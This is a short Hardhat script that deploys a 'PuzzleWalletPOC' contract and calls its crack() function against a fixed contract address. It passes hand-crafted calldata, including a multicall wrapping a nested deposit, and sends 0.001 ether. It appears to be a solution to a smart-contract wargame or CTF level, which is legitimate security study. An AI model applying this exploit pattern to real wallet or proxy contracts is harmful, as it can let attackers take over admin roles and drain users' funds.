import { ethers } from "hardhat";

async function main() {
  const PuzzleWalletPOC = await ethers.getContractFactory("PuzzleWalletPOC");
  const poc = await PuzzleWalletPOC.deploy();
  await poc.deployed();

  console.log(`PuzzleWalletPOC deployed to ${poc.address}`);

  await poc.crack("0x23AF6bbb6A8c18adE67F13fAecb9C5Caa0B7F557", "0x9d51d9b7000000000000000000000000dadada681e6270e1d0181442220a2e5608b11d21", "0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000", {
    value: ethers.utils.parseEther("0.001"),
  });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
